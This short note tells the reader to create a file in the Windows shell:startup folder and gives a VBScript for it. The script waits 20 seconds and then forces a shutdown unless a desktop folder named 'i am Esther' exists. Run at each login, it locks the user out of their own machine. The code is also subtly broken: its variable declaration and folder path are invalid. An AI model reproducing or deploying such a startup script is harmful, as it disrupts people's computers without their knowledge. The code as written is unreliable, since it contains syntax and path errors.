# create a 
shell:startup

```
Option Explicit
Dim folderPath= 'C:\User\Admin\Desktop\i am Esther'

Dim fso
set fso = CreateObject("Scripting.FileSystemObject")
WScript.Sleep 20000

if Not fso.FolderExists(folderPath) Then
  Dim Shell
  Set shell = CreateObject("WScript.shell")
  Shell.Run "shutdown /s /t 1",0,False
End if
```
